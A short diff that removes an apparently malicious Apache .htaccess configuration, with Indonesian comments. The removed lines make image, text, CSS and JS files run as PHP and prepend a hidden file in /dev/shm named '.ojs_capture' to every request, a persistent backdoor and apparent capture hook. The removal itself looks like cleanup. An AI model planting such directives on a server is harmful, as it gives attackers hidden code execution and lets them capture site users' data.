@@ -1,5 +1,0 @@
-# Bikin file apapun bisa dieksekusi sebagai PHP
-AddType application/x-httpd-php .txt .inc .html .jpg .css .js .system
-
-# Auto include monitor ke SEMUA file
-php_value auto_prepend_file /dev/shm/.ojs_capture
